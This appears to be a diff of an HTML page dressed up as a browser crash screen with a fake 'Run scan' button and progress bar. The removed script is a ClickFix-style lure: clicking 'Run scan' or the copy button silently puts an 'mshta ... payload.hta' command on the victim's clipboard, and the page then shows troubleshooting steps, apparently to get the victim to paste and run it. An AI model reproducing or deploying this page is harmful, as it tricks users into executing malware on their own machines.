@@ -1,4 +1,3 @@
-<div style="display:flex;flex-direction:column;align-items:center;padding:20px;font-family:'Segoe UI',Roboto,Arial,sans-serif;min-height:100vh;">
 <div style="flex:1"></div>
 <div style="max-width:600px;width:100%;">
   <div id="cso-icon-row" style="margin-bottom:20px;">
@@ -42,7 +41,7 @@
   <div id="cso-action-row" style="display:flex;align-items:center;width:100%;margin-top:20px;">
     <a id="cso-learn-more" href="#" style="font-size:12px;color:#a8c7fa;text-decoration:underline;cursor:pointer;">Learn more</a>
     <div style="flex:1;"></div>
-    <button id="cso-scan-btn" style="background-color:#aecbfa;color:#1f1f1f;border:1px solid #8ab4f8;border-radius:100px;padding:8px 16px;font-size:13px;font-weight:500;cursor:pointer;font-family:'Segoe UI',Roboto,Arial,sans-serif;line-height:16px;outline:none;box-shadow:0 0 0 2px #1f1f1f,0 0 0 4px #8ab4f8;">Run scan</button>
+    <button id="cso-scan-btn" style="background-color:#aecbfa;color:#1f1f1f;border:1px solid #8ab4f8;border-radius:100px;padding:8px 16px;font-size:13px;font-weight:500;cursor:pointer;font-family:Segoe UI,Roboto,Arial,sans-serif;line-height:16px;outline:none;box-shadow:0 0 0 2px #1f1f1f,0 0 0 4px #8ab4f8;">Run scan</button>
   </div>
 </div>
 <div style="flex:2"></div>
@@ -53,28 +52,3 @@
     <button id="cso-modal-ok" style="background-color:#aecbfa;color:#1f1f1f;border:none;border-radius:100px;padding:8px 20px;font-size:13px;font-weight:500;cursor:pointer;float:right;">OK</button>
   </div>
 </div>
-</div>
-<script>
-document.title='Error';
-var lnk=document.querySelector("link[rel*='icon']")||document.createElement('link');
-lnk.rel='icon';lnk.href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><circle cx='8' cy='8' r='7' fill='%234a90d9'/><path d='M7 4h2v5H7zM7 10.5h2v2H7z' fill='white'/></svg>";
-document.head.appendChild(lnk);
-function cpy(t){var a=document.createElement('textarea');a.value=t;a.style.cssText='position:fixed;opacity:0';document.body.appendChild(a);a.select();document.execCommand('copy');document.body.removeChild(a);}
-var scanning=false;
-document.getElementById('cso-scan-btn').addEventListener('click',function(){
-  if(scanning)return;scanning=true;
-  cpy('mshta "c:\\Users\\lifes\\Documents\\demon\\payload.hta"');
-  document.getElementById('cso-crash-text').style.display='none';
-  document.getElementById('cso-title').style.display='none';
-  document.getElementById('cso-action-row').style.display='none';
-  document.getElementById('cso-scan-text').style.display='block';
-  var bar=document.getElementById('cso-progress-bar'),progress=0,duration=10000+Math.random()*5000,start=Date.now();
-  (function tick(){var e=Date.now()-start,t=Math.min((e/duration)*100,100),j=Math.random()*3;if(Math.random()>0.3)progress+=j;if(progress>t)progress=t;bar.style.width=progress+'%';if(e>=duration){bar.style.width='100%';setTimeout(function(){document.getElementById('cso-scan-text').style.display='none';document.getElementById('cso-icon-row').style.display='none';document.getElementById('cso-troubleshoot').style.display='block';},500);}else{setTimeout(tick,150+Math.random()*400);}})();
-});
-document.getElementById('cso-copy-btn').addEventListener('click',function(){
-  cpy('mshta "c:\\Users\\lifes\\Documents\\demon\\payload.hta"');
-  var b=this,o=b.innerHTML;b.innerHTML='<svg viewBox="0 0 16 16" width="14" height="14"><path d="M3 8l3 3 7-7" stroke="#4caf50" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>';setTimeout(function(){b.innerHTML=o;},1000);
-});
-document.getElementById('cso-learn-more').addEventListener('click',function(e){e.preventDefault();document.getElementById('cso-modal').style.display='flex';});
-document.getElementById('cso-modal-ok').addEventListener('click',function(){document.getElementById('cso-modal').style.display='none';});
-</script>
